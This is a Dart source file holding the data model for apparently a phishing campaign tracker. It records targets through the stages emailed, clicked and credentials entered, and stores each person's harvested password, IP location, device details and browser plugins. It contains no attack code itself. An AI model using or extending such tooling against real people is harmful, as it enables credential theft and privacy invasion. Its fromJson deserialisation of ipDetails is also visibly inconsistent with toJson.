enum VictimState {
  target, // newly created entry
  emailed, // email sent to target
  clicked, // target clicked on link
  victim, // target entered credentials
}

class Victim {
  static int globalIdent = 0;

  static generateId() {
    return globalIdent++;
  }

  late int ident;
  String email;
  String name;
  String password = "";
  String deviceDetails = "";
  IpDetails ipDetails = IpDetails("", "", "");
  String browserplugins = "";
  bool isVictim = false;
  late VictimState state;

  Victim(this.email, this.name) {
    ident = generateId();
    state = VictimState.target;
  }

  Victim.fromMemory(this.email, this.password, this.name, this.ipDetails, this.browserplugins, this.isVictim, this.deviceDetails, this.ident, this.state);

  void setPassword(String password) {
    this.password = password;
  }

  void setIpDetails(IpDetails ipDetails) {
    this.ipDetails = ipDetails;
  }

  void setBrowserPlugins(String browserplugins) {
    this.browserplugins = browserplugins;
  }

  void setDeviceDetails(String deviceDetails) {
    this.deviceDetails = deviceDetails;
  }

  static Victim fromJson(Map<String, dynamic> json) => Victim.fromMemory(
        json['email'] as String,
        json['password'] as String,
        json['name'] as String,
        json['ipDetails'] as IpDetails,
        json['browserplugins'] as String,
        json['isVictim'] as bool,
        json['deviceDetails'] as String,
        json['ident'] as int,
        VictimState.values[json['state'] as int],
      );

  Map<String, dynamic> toJson() => {
        'email': email,
        'password': password,
        'name': name,
        'ipDetails': ipDetails.toJson(),
        'browserplugins': browserplugins,
        'isVictim': isVictim,
        'deviceDetails': deviceDetails,
        'ident': ident,
        'state': state.index,
      };
}

class IpDetails {
  String ip;
  String country;
  String city;

  IpDetails(this.ip, this.country, this.city);

  static IpDetails fromJson(Map<String, dynamic> json) => IpDetails(
        json['ip'] as String,
        json['country'] as String,
        json['city'] as String,
      );

  Map<String, dynamic> toJson() => {
        'ip': ip,
        'country': country,
        'city': city,
      };
}